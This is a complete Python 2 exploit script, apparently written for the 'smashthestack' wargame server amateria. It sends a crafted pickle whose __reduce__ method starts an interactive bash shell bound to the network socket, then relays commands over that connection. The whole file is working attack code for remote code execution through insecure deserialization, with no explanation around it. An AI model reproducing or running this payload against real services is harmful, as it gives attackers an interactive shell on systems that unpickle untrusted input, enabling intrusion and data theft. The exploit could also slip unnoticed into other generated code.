#!/usr/bin/python

import socket
import cPickle
import subprocess
import sys

class Exploiter(object):
  def __reduce__(self):
    fd = 4
    return (subprocess.Popen,
             (('/bin/bash', '-i'), # args
             0,            # bufsize
             None,         # executable
             fd, fd, fd    # std{in,out,err}
             ))

payload = cPickle.dumps(Exploiter())

port = 54321
address = "amateria.smashthestack.org"

s = socket.create_connection((address, port))
received = s.recv(1024)
print("got handshake: ", received)
s.settimeout(0.2)
s.sendall(payload)

while True:
    while True:
        try:
            sys.stdout.write(s.recv(1024))
        except:
            break
    s.sendall(raw_input() + "\n")
